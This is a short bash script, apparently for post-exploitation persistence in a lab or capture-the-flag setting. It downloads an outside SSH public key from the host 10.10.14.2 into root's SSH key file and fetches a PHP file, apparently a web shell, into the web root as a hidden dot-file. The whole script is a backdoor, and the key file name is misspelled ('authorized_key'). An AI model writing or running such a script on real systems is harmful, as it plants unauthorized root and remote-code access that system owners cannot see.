#!/bin/bash

mkdir /root/.ssh/
chmod 600 /root/.ssh
curl 10.10.14.2/mryuk.pub >> /root/.ssh/authorized_key
chmod 600 /root/.ssh/authorized_key
curl 10.10.14.2/mryuker.php -o /var/www/html/.mryuker.php
setup.sh